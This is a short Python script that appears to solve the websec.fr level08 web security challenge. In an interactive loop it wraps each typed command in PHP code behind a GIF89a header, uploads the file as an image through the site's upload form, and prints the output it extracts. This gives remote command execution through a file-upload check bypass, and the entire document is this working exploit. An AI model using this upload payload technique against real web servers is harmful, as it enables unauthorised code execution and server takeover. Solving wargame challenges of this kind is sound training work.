import requests
import re

TARGET = "https://websec.fr/level08/index.php"

while True:
    cmd = input("$ ")
    payload = f"""GIF89a<?php {cmd};?>"""

    with open("payload.gif", "w") as f:
        f.write(payload)

    files = {"fileToUpload": open("payload.gif", "rb")}
    r = requests.post(TARGET, data = {"submit": "Upload Image"}, files=files)

    try:
        result = re.search(r'<pre>GIF89a(.*)</pre>', r.text, re.S)
        print(result.group(1))
    except:
        print("Not found")